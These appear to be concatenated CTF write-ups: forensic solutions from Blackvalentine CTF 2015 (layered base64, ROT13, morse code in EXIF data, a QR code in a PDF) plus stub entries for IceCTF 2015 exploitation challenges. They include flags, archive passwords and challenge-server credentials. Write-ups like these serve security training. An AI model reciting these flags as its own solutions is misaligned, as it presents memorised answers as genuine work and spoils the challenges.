6e:64:33:59:58:70:61:65:56:68:45:51:6e:4a:4e:65:6d:78:6a:54:55:64:7a:65:6b:30:78:64:33:64:68:65:6c:56:36:57:45:52:43:63:6b:35:71:52:57:6c:50:65:55:4a:71:57:6c:68:61:61:46:70:35:51:6d:31:61:4d:6d:68:73:54:47:31:6b:62:47:4a:74:52:6d:31:6c:56:7a:56:75:59:32:6c:6f:4e:46:6c:75:51:6d:6c:6c:53:46:6f:31:53:31:52:7a:50:51:3d:3d
$ cat pL4n3t.mp3 | tr -d ':' | xxd -r -p | xxd
0000000: 5358 6c46 646d 4648 576d 784d 4d6a 6b79  SXlFdmFHWmxMMjky
0000010: 5756 4d35 616d 4a48 5a44 465a 6255 566e  WVM5amJHZDFZbUVn
0000020: 597a 4a57 6157 5670 516d 3161 4d6c 5979  YzJWaWVpQm1aMlYy
0000030: 5756 6852 5a32 5275 6347 705a 6256 5a75  WVhRZ2RucGpZbVZu
0000040: 5355 6877 6457 5649 536d 3561 567a 566f  SUhwdWVISm5aVzVo
0000050: 576d 6c43 4e46 6c70 5154 6c4a 5130 7031  WmlCNFlpQTlJQ0p1
0000060: 5a47 314b 6231 4e48 5257 6c4a 5345 4a70  ZG1Kb1NHRWlJSEJp
0000070: 5a55 4e42 4f55 6c44 536b 464e 5647 7378  ZUNBOUlDSkFNVGsx
0000080: 5955 5646 6155 6c49 6147 6c6a 5230 6f30  YUVFaUlIaGljR0o0
0000090: 5a47 3572 5a31 4254 516a 5a69 626d 6835  ZG5rZ1BTQjZibmh5
00000a0: 576a 4a57 6456 6c58 5757 396c 5230 6c7a  WjJWdVlXWW9lR0lz
00000b0: 5355 6843 6157 5644 6132 6461 6257 5276  SUhCaWVDa2dabWRv
00000c0: 576c 4e42 4f55 6c73 6433 6468 656c 5577  WlNBOUlsd3dhelUw
00000d0: 5745 5243 636b 3571 6147 4e4e 5233 4d79  WERCck5qaGNNR3My
00000e0: 546c 5a33 6432 4636 5358 6459 5245 4a79  TlZ3d2F6SXdYREJy
00000f0: 546b 5261 5930 3148 637a 426a 526e 6433  TkRaY01HczBjRnd3
0000100: 5958 7052 6546 6845 516e 4a4f 5247 526a  YXpReFhEQnJORGRj
0000110: 5455 647a 6555 3147 6433 6468 656b 7034  TUdzeU1Gd3dhekp4
0000120: 5745 5243 636b 307a 536d 4e4e 5233 4e35  WERCck0zSmNNR3N5
0000130: 5455 5a33 6432 4636 576e 5a59 5245 4a79  TUZ3d2F6WnZYREJy
0000140: 546c 5257 5930 3148 637a 4a4e 566e 6433  TlRWY01HczJNVnd3
0000150: 5958 704e 4d56 6845 516e 4a4f 5245 5a6a  YXpNMVhEQnJOREZj
0000160: 5455 647a 4d55 3547 6433 6468 656d 4d78  TUdzMU5Gd3dhemMx
0000170: 5745 5243 636b 3545 6147 4e4e 5233 4d79  WERCck5EaGNNR3My
0000180: 5456 5a33 6432 4636 576e 6c59 5245 4a79  TVZ3d2F6WnlYREJy
0000190: 546e 7073 5930 3148 637a 424e 566e 6433  TnpsY01HczBNVnd3
00001a0: 5958 7061 6556 6845 516e 4a4e 656d 786a  YXpaeVhEQnJNemxj
00001b0: 5455 647a 656b 3078 6433 6468 656c 5636  TUdzek0xd3dhelV6
00001c0: 5745 5243 636b 3571 5257 6c50 6555 4a71  WERCck5qRWlPeUJq
00001d0: 576c 6861 6146 7035 516d 3161 4d6d 6873  WlhaaFp5Qm1aMmhs
00001e0: 5447 316b 6247 4a74 526d 316c 567a 5675  TG1kbGJtRm1lVzVu
00001f0: 5932 6c6f 4e46 6c75 516d 6c6c 5346 6f31  Y2loNFluQmllSFo1
0000200: 5331 527a 5051 3d3d                      S1RzPQ==
```

Looks like the result is a base64 encoded string.

We can pipe the result right into `base64` to decode it:

```bash
$ cat pL4n3t.mp3 | tr -d ':' | xxd -r -p | base64 --decode | xxd
0000000: 4979 4576 6147 5a6c 4c32 3932 5953 396a  IyEvaGZlL292YS9j
0000010: 6247 6431 596d 4567 6332 5669 6569 426d  bGd1YmEgc2VieiBm
0000020: 5a32 5632 5958 5167 646e 706a 596d 566e  Z2V2YXQgdnpjYmVn
0000030: 4948 7075 6548 4a6e 5a57 3568 5a69 4234  IHpueHJnZW5hZiB4
0000040: 5969 4139 4943 4a75 646d 4a6f 5347 4569  YiA9ICJudmJoSGEi
0000050: 4948 4269 6543 4139 4943 4a41 4d54 6b31  IHBieCA9ICJAMTk1
0000060: 6145 4569 4948 6869 6347 4a34 646e 6b67  aEEiIHhicGJ4dnkg
0000070: 5053 4236 626e 6879 5a32 5675 5957 596f  PSB6bnhyZ2VuYWYo
0000080: 6547 4973 4948 4269 6543 6b67 5a6d 646f  eGIsIHBieCkgZmdo
0000090: 5a53 4139 496c 7777 617a 5530 5844 4272  ZSA9IlwwazU0XDBr
00000a0: 4e6a 6863 4d47 7332 4e56 7777 617a 4977  NjhcMGs2NVwwazIw
00000b0: 5844 4272 4e44 5a63 4d47 7330 6346 7777  XDBrNDZcMGs0cFww
00000c0: 617a 5178 5844 4272 4e44 6463 4d47 7379  azQxXDBrNDdcMGsy
00000d0: 4d46 7777 617a 4a78 5844 4272 4d33 4a63  MFwwazJxXDBrM3Jc
00000e0: 4d47 7379 4d46 7777 617a 5a76 5844 4272  MGsyMFwwazZvXDBr
00000f0: 4e54 5663 4d47 7332 4d56 7777 617a 4d31  NTVcMGs2MVwwazM1
0000100: 5844 4272 4e44 4663 4d47 7331 4e46 7777  XDBrNDFcMGs1NFww
0000110: 617a 6331 5844 4272 4e44 6863 4d47 7332  azc1XDBrNDhcMGs2
0000120: 4d56 7777 617a 5a79 5844 4272 4e7a 6c63  MVwwazZyXDBrNzlc
0000130: 4d47 7330 4d56 7777 617a 5a79 5844 4272  MGs0MVwwazZyXDBr
0000140: 4d7a 6c63 4d47 737a 4d31 7777 617a 557a  MzlcMGszM1wwazUz
0000150: 5844 4272 4e6a 4569 4f79 426a 5a58 5a68  XDBrNjEiOyBjZXZh
0000160: 5a79 426d 5a32 686c 4c6d 646c 626d 466d  ZyBmZ2hlLmdlbmFm
0000170: 6557 356e 6369 6834 596e 4269 6548 5a35  eW5ncih4YnBieHZ5
0000180: 4b54 733d                                KTs=
```

The result is again base64 encoded, lets decode it once again to get the following:

```bash
$ cat pL4n3t.mp3 | tr -d ':' | xxd -r -p | base64 --decode | base64 --decode | xxd
0000000: 2321 2f68 6665 2f6f 7661 2f63 6c67 7562  #!/hfe/ova/clgub
0000010: 6120 7365 627a 2066 6765 7661 7420 767a  a sebz fgevat vz
0000020: 6362 6567 207a 6e78 7267 656e 6166 2078  cbeg znxrgenaf x
0000030: 6220 3d20 226e 7662 6848 6122 2070 6278  b = "nvbhHa" pbx
0000040: 203d 2022 4031 3935 6841 2220 7862 7062   = "@195hA" xbpb
0000050: 7876 7920 3d20 7a6e 7872 6765 6e61 6628  xvy = znxrgenaf(
0000060: 7862 2c20 7062 7829 2066 6768 6520 3d22  xb, pbx) fghe ="
0000070: 5c30 6b35 345c 306b 3638 5c30 6b36 355c  \0k54\0k68\0k65\
0000080: 306b 3230 5c30 6b34 365c 306b 3470 5c30  0k20\0k46\0k4p\0
0000090: 6b34 315c 306b 3437 5c30 6b32 305c 306b  k41\0k47\0k20\0k
00000a0: 3271 5c30 6b33 725c 306b 3230 5c30 6b36  2q\0k3r\0k20\0k6
00000b0: 6f5c 306b 3535 5c30 6b36 315c 306b 3335  o\0k55\0k61\0k35
00000c0: 5c30 6b34 315c 306b 3534 5c30 6b37 355c  \0k41\0k54\0k75\
00000d0: 306b 3438 5c30 6b36 315c 306b 3672 5c30  0k48\0k61\0k6r\0
00000e0: 6b37 395c 306b 3431 5c30 6b36 725c 306b  k79\0k41\0k6r\0k
00000f0: 3339 5c30 6b33 335c 306b 3533 5c30 6b36  39\0k33\0k53\0k6
0000100: 3122 3b20 6365 7661 6720 6667 6865 2e67  1"; cevag fghe.g
0000110: 656e 6166 796e 6772 2878 6270 6278 7679  enafyngr(xbpbxvy
0000120: 293b                                     );
```

Looks like python code thats encrypted using caesar cipher, most likely rot13 - so we try to decipher the result:

```bash
$ cat pL4n3t.mp3 | tr -d ':' | xxd -r -p | base64 --decode | base64 --decode | tr '[a-zA-Z]' '[n-za-mN-ZA-M]' && echo
#!/usr/bin/python from string import maketrans ko = "aiouUn" cok = "@195uN" kocokil = maketrans(ko, cok) stur ="\0x54\0x68\0x65\0x20\0x46\0x4c\0x41\0x47\0x20\0x2d\0x3e\0x20\0x6b\0x55\0x61\0x35\0x41\0x54\0x75\0x48\0x61\0x6e\0x79\0x41\0x6e\0x39\0x33\0x53\0x61"; print stur.translate(kocokil);
```

What's left to do is save the output to [run.py](./run.py), fix the indentation and run it:

```bash
$ python2.7 run.py 
x54x68x65x20x46x4cx41x47x20x2dx3ex20x6bx55x61x35x41x54x75x48x61x6ex79x41x6ex39x33x53x61
```

We have to decode these hex characters once again to binary to finally receive the flag, `kUa5ATuHanyAn93Sa`:

```bash
$ python2.7 run.py | tr -d 'x' | xxd -r -p && echo
The FLAG -> kUa5ATuHanyAn93Sa
```

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic4 200

**Category:** Forensic
**Points:** 200
**Author:** mirfansulaiman
**Description:**

> basisSixtyFour , Password: `*7sdj@L[a/xc<Xms02-z=203dl;`
>
> http://ctf.web-attack.info/misssion/9

## Write-up

by [polym](https://github.com/abpolym)

First, we extract the content of the password protected zip:

```bash
$ 7z x Forensic-4.zip -p'*7sdj@L[a/xc<Xms02-z=203dl;' -oout
$ cd out/FORENSIC\ SOAL\ 1\ LEVEL\ 2/
```

`Wh4Tis1t.png` actually is the base64 encoded representation of a PNG, which we first have to decode and save:

```bash
$ file Wh4Tis1t.png 
Wh4Tis1t.png: ASCII text, with very long lines, with no line terminators
$ cat Wh4Tis1t.png && echo
iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6CAIAAAAHjs1qAAAABmJLR0QA/wD/AP+gvaeTAAAE5klEQVR4nO3dQa7qOBRAwdDq/W/59QqCZNrGDqdq+hHk8Y88uDHO6+/v74KGf3ZfAHyP3AmROyFyJ0TuhMidELkTIndC/n3zb6/X62vX8X/c3Sm7u/7Vd9Zmfe7q6x99/6f3cFndSZE7IXInRO6EyJ0QuRMid0Lezd3v7PpFyOjcd9ace/T9Z90HeMr8+yk9XFZ3UuROiNwJkTshcidE7oTInZBP5u53Zs2DT9uPPvp3rX7/WXP91fP7A3uwuhMid0LkTojcCZE7IXInRO6EzJy7n2bWvHyWp5978wOs7oTInRC5EyJ3QuROiNwJkTshvzx3P+2cltXnsq/+3B9gdSdE7oTInRC5EyJ3QuROiNwJmTl3f8p8d9a577POdVn9+l373Q/swepOiNwJkTshcidE7oTInRC5E/LJ3P2053re2TXnPs2sv/fOU76Hy+pOitwJkTshcidE7oTInRC5E/I6cFPyaqfNiXfNxYP/9VZ3QuROiNwJkTshcidE7oTInZCZc/dd+8VXz61Hrd5nP8uuc+I33k+wuhMid0LkTojcCZE7IXInRO6EfOO5qqvnyrvmuKedY3PaeTgHnmNjdSdE7oTInRC5EyJ3QuROiNwJebfffdfcdPUcetRp59Lc2fW7glm+cJ1Wd0LkTojcCZE7IXInRO6EyJ2QT86Z2TX/HrX6OlfP4087D+e09/+A1Z0QuRMid0LkTojcCZE7IXIn5N05M7Pmyk85L2XXnP4p5+HcOe2+iv3ucF1yJ0XuhMidELkTIndC5E7Iu7n7aefJnHaOymn3Ae7smouf9hzZy+pOitwJkTshcidE7oTInRC5EzLzuaqr5+JP2Y/+lP3fs17/lP3xl9WdFLkTIndC5E6I3AmROyFyJ+ST891v32vx3HeWXeeyH3je+RQPOife6k6I3AmROyFyJ0TuhMidELkTMvO5qqvPCz9tTn/auTer7foeRjnfHa5L7qTInRC5EyJ3QuROiNwJ+cbcffR97pw23x21677E6PuM2vU7B89VhXfkTojcCZE7IXInRO6EyJ2Qd+e7P32+fto563dWX+dp++ad7w7fIHdC5E6I3AmROyFyJ0TuhJx4zsyd0+b9tb93tS/M463uhMidELkTIndC5E6I3AmROyEz97uvnk8/6PmdQ3bt73/K+Tx3nDMD78idELkTIndC5E6I3AmROyHv5u6jc9zVr1/tKfvLd13nqF33Md6wuhMid0LkTojcCZE7IXInRO6EfLLf/TR3c9zROfeu82FW/x5gll2/N5jI6k6I3AmROyFyJ0TuhMidELkT8m7ufucpzyvdtY9813k7d057Tu3GffBWd0LkTojcCZE7IXInRO6EyJ2QT+bud3btF59l1xx61OrPPe13DhP/X6zuhMidELkTIndC5E6I3AmROyEz5+6nmbV//bTnla6+v7F6v/6oifcZrO6EyJ0QuRMid0LkTojcCZE7Ib88d991zsysefbo5446bV/7qA++T6s7IXInRO6EyJ0QuRMid0LkTsjMufuuc1fu7DqPfOP55UOefp/hg+/T6k6I3AmROyFyJ0TuhMidELkT8snc/Vf3Sd857Xmoo69/yrn7s75P+93huuROitwJkTshcidE7oTInZDXaZuwYR2rOyFyJ0TuhMidELkTIndC5E6I3An5DzfRISTqGHbgAAAAAElFTkSuQmCC
$ cat Wh4Tis1t.png | base64 --decode > pic.png
```

The final PNG is a QR code, which we have to decode using [an online QR decoder](https://zxing.org/w/decode.jspx) to get the flag, `1bT3aMj4b0Det4b3K`:

![](./pic.png)


## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic5 100

**Category:** Forensic
**Points:** 100
**Author:** abdilahrf
**Description:**

> hohohahiho  , Password: `P3nYimP4n94NG+_::{127.0.0.1}`
>
> http://ctf.web-attack.info/misssion/11

## Write-up

by [polym](https://github.com/abpolym)

We are given a password protected zip that we extract using `7z x Forensic-5.zip -p'P3nYimP4n94NG+_::{127.0.0.1}' -oout`.

Two files are extracted - another password encrypted zip, `Koala.zip`, and an ASCII file `passwd.txt`, which just contains `SHA256 : BINARY`.

`passwd.txt` suggests to use the sha256 of binary as password for the second password protected zip.

However, using the sha256 hash of `BINARY` as password for `Koala.zip` doesn't work.

The authors were quite cheeky and meant to use the binary representation of SHA256 as password:

```bash
$ 7z x Koala.zip -p'01010011 01001000 01000001 00110010 00110101 00110110'

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: Koala.zip

Extracting  Koala.jpg

Everything is Ok

Size:       789101
Compressed: 780128
```

We get a picture of a Koala bear and have a look at the exif metadata using `exiftool`:

```bash
$ exiftool Koala.jpg 
ExifTool Version Number         : 9.99
File Name                       : Koala.jpg
Directory                       : .
File Size                       : 771 kB
File Modification Date/Time     : 2014:11:11 17:33:29+01:00
File Access Date/Time           : 2015:12:26 02:39:38+01:00
File Inode Change Date/Time     : 2015:12:26 02:39:34+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
DCT Encode Version              : 100
APP14 Flags 0                   : (none)
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
Make                            : http://indonesianbacktrack.or.id
Camera Model Name               : 0x12999 Mega Pixel
Modify Date                     : 2009:03:12 13:48:28
Artist                          : MO
Copyright                       : OR ,  All Rights Reserved.
Date/Time Original              : 2008:02:11 11:32:43
Create Date                     : 2008:02:11 11:32:43
Sub Sec Time Original           : 17
Sub Sec Time Digitized          : 17
XP Title                        : Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
XP Comment                      : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX..AABA ABAA AB BBA BBBAAA BAB AAAAB ABBA B AAABB BA ABBA AAAAB B ABBBB BB AAB ABA AAAAB..Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras faucibus odio ut metus vulputate, id laoreet magna..volutpat. Integer nec enim vel arcu porttitor egestas
XP Author                       : MO
XP Keywords                     : SE
XP Subject                      : <| tr AB .- |>
Padding                         : (Binary data 2060 bytes, use -b option to extract)
Compression                     : JPEG (old-style)
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Thumbnail Offset                : 5758
Thumbnail Length                : 6625
Quality                         : 100%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:40:08
Marked                          : True
Web Statement                   : http://pro.corbis.com/search/searchresults.asp?txt=42-15564978&openImage=42-15564978
Rights                          : OR ,  All Rights Reserved.
Creator                         : MO
Subject                         : SE
Title                           : Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
Description                     : Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
Rating                          : 4
Warning                         : [minor] Fixed incorrect URI for xmlns:MicrosoftPhoto
Rating Percent                  : 63
Lens Manufacturer               : CODE
Last Keyword XMP                : SE
Image Width                     : 1024
Image Height                    : 768
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1024x768
Megapixels                      : 0.786
Create Date                     : 2008:02:11 11:32:43.17
Date/Time Original              : 2008:02:11 11:32:43.17
Thumbnail Image                 : (Binary data 6625 bytes, use -b option to extract)
```

The base64 encoded string `Tm9wZSAsIG5vdCBoZXJlIDspCg==` is a red herring:

```bash
$ echo 'Tm9wZSAsIG5vdCBoZXJlIDspCg==' | b64d | xxd
0000000: 4e6f 7065 202c 206e 6f74 2068 6572 6520  Nope , not here 
0000010: 3b29 0a                                  ;).
```

But we see a string that only consists of `A` and `B`:

    AABA ABAA AB BBA BBBAAA BAB AAAAB ABBA B AAABB BA ABBA AAAAB B ABBBB BB AAB ABA AAAAB

This looks like morse-code, so we translate it to real morse-code:

```bash
$ echo 'AABA ABAA AB BBA BBBAAA BAB AAAAB ABBA B AAABB BA ABBA AAAAB B ABBBB BB AAB ABA AAAAB' | tr 'AB' '.-'
..-. .-.. .- --. ---... -.- ....- .--. - ...-- -. .--. ....- - .---- -- ..- .-. ....-
```

Decoding this morse-code using [an online morse-code decoder](https://gc.de/gc/morse/), we get the flag `flag:k4pt3np4t1mur4`.
## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic6 100

**Category:** Forensic
**Points:** 100
**Author:** mirfansulaiman
**Description:** 

> http://ctf.web-attack.info/misssion/12

## Write-up

by [polym](https://github.com/abpolym)

We are given [a pdf](./get.pdf) that contains nothing much:

![](./get.pdf)

Applying `exiftool` on the PDF reveals that something is wrong with its `xref` table:

```bash
$ exiftool get.pdf 
ExifTool Version Number         : 9.99
File Name                       : get.pdf
Directory                       : .
File Size                       : 1021 bytes
File Modification Date/Time     : 2015:12:26 01:58:57+01:00
File Access Date/Time           : 2015:12:26 02:48:37+01:00
File Inode Change Date/Time     : 2015:12:26 02:46:20+01:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.1
Linearized                      : No
Warning                         : Invalid xref table
```

We can open the pdf using any editor (such as `vim`) to find interesting hexadecimal characters that decoded yield a `bit.ly` link:

```bash
[...]
 /JS (68 74 74 70 25 33 41 25 32 66 25 32 66 62 69 74 2e 6c 79 25 32 66 31 76 31 4e 6d 35 4d)
[...]
$ echo '68 74 74 70 25 33 41 25 32 66 25 32 66 62 69 74 2e 6c 79 25 32 66 31 76 31 4e 6d 35 4d' | xxd -r -p  && echo
http%3A%2f%2fbit.ly%2f1v1Nm5M
```

[This bit.ly link](http://bit.ly/1v1Nm5M) leads us to a QR code:

![](2djtr89.jpg)

We decode this QR code using [an online QR decoder](https://zxing.org/w/decode.jspx) to get the flag, `IrJendr4LSo3DirMan`.

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Misc1 400

**Category:** Misc
**Points:** 400
**Author:** arieftirta
**Description:**

> * [misc.zip](misc.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Misc2 400

**Category:** Misc
**Points:** 400
**Author:** abdilahrf
**Description:**

> out of the box
>
> * [gamebotis.zip](gamebotis.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015 write-ups

* <http://ctf.web-attack.info/>
* [Scoreboard](http://ctf.web-attack.info/scoreboard.php)
* [Slideshow with writeups](http://www.slideshare.net/taqrim/juara-3jrsfaisalwriteupctfindonesianbacktrackteam)

## Completed write-ups

* [crypto/crypto-1](crypto/crypto-1)
* [crypto/crypto-2](crypto/crypto-2)
* [crypto/crypto-4](crypto/crypto-4)
* [forensic/forensic-1](forensic/forensic-1)
* [forensic/forensic-2](forensic/forensic-2)
* [forensic/forensic-3](forensic/forensic-3)
* [forensic/forensic-4](forensic/forensic-4)
* [forensic/forensic-5](forensic/forensic-5)
* [forensic/forensic-6](forensic/forensic-6)

## External write-ups only

* none yet

## Missing write-ups

* [crypto/crypto-3](crypto/crypto-3)
* [misc/misc-1](misc/misc-1)
* [misc/misc-2](misc/misc-2)
* [reverse/reverse-1](reverse/reverse-1)
* [reverse/reverse-2](reverse/reverse-2)
* [website/web-1](website/web-1)
* [website/web-2](website/web-2)
* [website/web-3](website/web-3)
* [website/web-4](website/web-4)# IBTeam Blackvalentine CTF 2015: Reverse1 200

**Category:** Reverse
**Points:** 200
**Author:** arieftirta
**Description:**

> * [iamlegend.zip](iamlegend.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Reverse2 400

**Category:** Reverse
**Points:** 400
**Author:** arieftirta
**Description:**

> * [secretbyte.zip](secretbyte.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Web1 200

**Category:** Website
**Points:** 200
**Author:** abdilahrf
**Description:**

> Directory Listing http://ctf.web-attack.info/soalweb/Web1/

## Write-up

(TODO)

> Flag: primal split

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Web2 200

**Category:** Website
**Points:** 200
**Author:** abdilahrf
**Description:**

> Be a lucky visitor
>
> Directory Listing http://ctf.web-attack.info/soalweb/Web2/

## Write-up

(TODO)

>Flag: 3nt3GGWPBr0

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Web3 300

**Category:** Website
**Points:** 300
**Author:** abdilahrf
**Description:**

> Full Privilages
>
> Directory Listing http://ctf.web-attack.info/soalweb/Web3/

## Write-up

(TODO)

>Flag: L3mp3rItUWueNakLoh

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Web4 500

**Category:** Website
**Points:** 500
**Author:** abdilahrf
**Description:**

> find the baby
>
> Directory Listing http://ctf.web-attack.info/soalweb/Web3/

## Write-up

(TODO)

>Flag: N4g4!LluSs10N

## Other write-ups and resources

* none yet
# IceCTF 2015: Fermat

**Category:** Binary
**Points:** 80
**Description:** 

> This program is vulnerabel to format string attacks! See if you can modify a variable by supplying a format string!. The binary can be found at <code>/home/fermat</code> on the <a target='_blank' href='http://icec.tf/play/shell'>shell</a>

**Hint:**

> There is already a pointer to the variable on the stack! Also, %n may be useful!

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-fermat-80pts-binary/>
* <http://blog.atx.name/icectf/#Fermat>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: fsociety

**Category:** Binary
**Points:** 95
**Description:** 

> <code>MrRobot</code> doesn't want to talk to anyone without the proper passphrase. You can find him in the <a target='_blank' href='http://icec.tf/play/chat'>Chat</a>. He also left us this [strange file](./fsociety00.dat)

**Hint:**

> It only seems to respond to certain nicknames as well

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IceCTF 2015: Yee-Haw Cowboy!

**Category:** Binary
**Points:** 70
**Description:** 

> There's this neat little program that prints out a cow with given text from a file with the .cow extension. You can find it under <code>/home/cow</code> on the <a target='_blank' href='http://icec.tf/play/shell'>shell</a>

**Hint:**

> If only we could trick it into opening flag.txt

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-yee-haw-cowboy-70-binary/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Yee-Haw%20Cowboy!/Solution.txt>
# IceCTF 2015: Bender's Big Score

**Category:** Binary Exploitation
**Points:** 200
**Description:** 

> There's only one thing that Bender loves more than Blackjack and that seems to be stopping him from having a secure blackjack server. Can you beat him? <code>/home/blackjack</code>

**Hint:**

> Thanks for the money, boltbag.

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.pawpetersen.dk/icectf-2015-benders-big-score/>
# IceCTF 2015: Elevate

**Category:** Binary Exploitation
**Points:** 120
**Description:** 

> Do you want an elevated shell? I want an elevated shell. Get me one: <code>/home/elevate</code>

**Hint:**

> How can you access a password if you can't access it?

## Write-up

(TODO)

## Other write-ups and resources

* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: Onions have layers

**Category:** Binary Exploitation
**Points:** 85
**Description:** 

> During your research, you have found a mysterious file. Although titled '[mystery.sh](./mystery.sh)', it does not seem to run as a regular shell script.

**Hint:**

> The bottom of the pit is most interesting

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Onions%20have%20layers/Solution.sh>
# IceCTF 2015: Open Sesame

**Category:** Binary Exploitation
**Points:** 75
**Description:** 

> <p>Look at this [binary file](./icectf.class), it looks to be written in Java but we don't have a clue what it's supposed to do.</p><p>You can run it with <code>java icectf <flag></code></p>

**Hint:**

> If only there was some way to 'decompile' this

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Open%20Sesame/Solution.txt>
# IceCTF 2015: Overflow 1

**Category:** Binary Exploitation
**Points:** 55
**Description:** 

> Why don't you try your hand at <code>/home/overflow1</code>? Good luck!

**Hint:**

> This is just <a target='_blank' href='https://en.wikipedia.org/wiki/Buffer_overflow'>buffer overflow</a>.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://medium.com/@lumpus/icectf-overflow-1-50-d5617d1855e#.y6vi5v3na>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Overflow%201/Solution.txt>
# IceCTF 2015: Overflow 2

**Category:** Binary Exploitation
**Points:** 70
**Description:** 

> I got another one: <code>/home/overflow2</code>. Good luck!

**Hint:**

> The code doesn't execute <code>give_shell</code>, but can you force it to?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
# IceCTF 2015: PyShell

**Category:** Binary Exploitation
**Points:** 100
**Description:** 

> <p>Daniel is running this server which allows you to evaluate basic python expressions. It's clear that he's tried to secure it though. Can you see if you can get it to print the flag?</p> <p>You can access it by running <code>nc vuln2015.icec.tf 8000</code>.</p><p>[Source](./shell.py)</p>

**Hint:**

> Even if some keywords are banned, is that gonna stop you?

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/icectf2015/2015/08/24/pyshell.html>
* <http://blog.oleaass.com/ctf-icectf-pyshell-100-binary-exploitation/>
* <http://blog.atx.name/icectf/#PyShell>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/PyShell/Solution.txt>
# IceCTF 2015: Shocked!

**Category:** Binary Exploitation
**Points:** 70
**Description:** 

> <p>We found this server, which gives you the current date and time when you connect to it. Useful, right? We think there is more to it though...</p> <p>You can access it by running <code>ssh -p 2022 ctf@vuln2015.icec.tf</code>. The password is <code>icectf2015</code>.</p>

**Hint:**

> I think something suspicious might be running this code.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-shocked-70-binary-exploitation/>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: Simple

**Category:** Binary Exploitation
**Points:** 30
**Description:** 

> Simple, right? <code>nc vuln2015.icec.tf 10000</code>.

**Hint:**

> What is at the other end?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Simple/Solution.txt>
# IceCTF 2015: SuperNote

**Category:** Binary Exploitation
**Points:** 150
**Description:** 

> SuperNote is a startup aiming to become the best note taking app in the world! They asked us to pentest their software while it is in the beta stage: <code>/home/supernote</code>

**Hint:**

> So the one who carries his home around town met up with the fluffy one, and they proceeded to determine which one of them was quicker. The answer? Neither.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#SuperNote>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: ...What?

**Category:** Binary Exploitation
**Points:** 190
**Description:** 

> Uh, what? <code>/home/what</code>

**Hint:**

> It's a binary, but can you look at the code somehow?

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://blog.atx.name/icectf/#What>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>

### Meta

Keywords:

* Stack Overflow in `__iso99_scanf`
* Check Evasion

We are given a stripped 32bit ELF for i386 Linux:

```bash
$ file what
what: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=2d9562c67216e855c9fcc76dab49e3ac7811770a, stripped
```

